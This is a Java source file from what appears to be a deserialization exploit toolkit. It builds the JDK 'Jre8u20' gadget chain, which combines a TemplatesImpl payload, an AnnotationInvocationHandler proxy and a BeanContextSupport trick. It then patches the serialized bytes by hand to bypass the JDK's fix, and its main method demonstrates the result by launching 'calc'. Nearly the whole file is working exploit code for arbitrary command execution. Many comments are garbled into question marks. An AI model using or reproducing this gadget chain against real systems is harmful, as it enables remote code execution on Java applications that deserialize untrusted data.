package com.aurora.Gadgets;


import com.aurora.Gadgets.utils.Gadgets;
import com.aurora.Gadgets.utils.Reflections;
import com.aurora.Gadgets.utils.Util;
import com.aurora.SupportType.PayloadType;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

public class Jre8u20 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous = new FileOutputStream("888.ser");
        fous.write(bytes);
        fous.close();
        FileInputStream file = new FileInputStream("888.ser");
        ObjectInputStream obj = new ObjectInputStream(file);
        obj.readObject();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type, param);
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler handler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(handler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(handler, Templates.class);
        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object

        LinkedHashSet set = new LinkedHashSet();

        BeanContextSupport bcs = new BeanContextSupport();
        Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
        Field serializable = cc.getDeclaredField("serializable");
        serializable.setAccessible(true);
        serializable.set(bcs, 0);

        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
        beanContextChildPeer.set(bcs, bcs);

        set.add(bcs);

        //?????????
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);

        oos.writeObject(set);
        oos.writeObject(handler);
        oos.writeObject(templates);
        oos.writeObject(proxy);
        oos.close();

        byte[] bytes = baous.toByteArray();
        bytes[89] = 3; //??????hashset???????????????????????????

        //?????? TC_ENDBLOCKDATA ???????????????
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 & bytes[i+3] == 0 &&
                    bytes[i+4] == 120 && bytes[i+5] == 120 && bytes[i+6] == 115){
                bytes = Util.deleteAt(bytes, i + 5);
                break;
            }
        }


        //??? serializable ??????????????? 1
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 120 && bytes[i+1] == 0 && bytes[i+2] == 1 && bytes[i+3] == 0 &&
                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 115){
                bytes[i+6] = 1;
                break;
            }
        }

        /**
         TC_BLOCKDATA - 0x77
         Length - 4 - 0x04
         Contents - 0x00000000
         TC_ENDBLOCKDATA - 0x78
         **/

        //?????????????????????????????????????????? AnnotationInvocationHandler ??????
        //???????????? AnnotationInvocationHandler ?????? BeanContextSupport ????????????
        //0x77 = 119, 0x78 = 120
        //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 119 && bytes[i+1] == 4 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 120){
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                break;
            }
        }

        /*
              serialVersionUID - 0x00 00 00 00 00 00 00 00
                  newHandle 0x00 7e 00 28
                  classDescFlags - 0x00 -
                  fieldCount - 0 - 0x00 00
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_NULL - 0x70
              newHandle 0x00 7e 00 29
         */
        //0x78 = 120, 0x70 = 112
        //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 0 &&
                    bytes[i+8] == 0 && bytes[i+9] == 0 && bytes[i+10] == 0 && bytes[i+11] == 120 &&
                    bytes[i+12] == 112){
                i = i + 13;
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x77);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x04);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x78);
                break;
            }
        }

        //??? sun.reflect.annotation.AnnotationInvocationHandler ??? classDescFlags ??? SC_SERIALIZABLE ????????? SC_SERIALIZABLE | SC_WRITE_METHOD
        //????????????????????????????????????????????????????????????debug ???????????? pwntester??? poc ?????????????????????
        //???????????????????????? SC_WRITE_METHOD ???????????? defaultDataEnd = true????????? BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1))
        // -> count = ois.readInt(); ?????????????????????????????????????????????
        // ?????? SC_WRITE_METHOD ???????????????????????????????????????????????????
        // ????????? 7375 6e2e 7265 666c 6563 --> sun.reflect...
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 &&
                    bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){
                i = i + 58;
                bytes[i] = 3;
                break;
            }
        }

        //????????????????????? TC_BLOCKDATA????????? HashSet ????????????
        bytes = Util.addAtLast(bytes, (byte) 0x78);

        return bytes;
    }
}
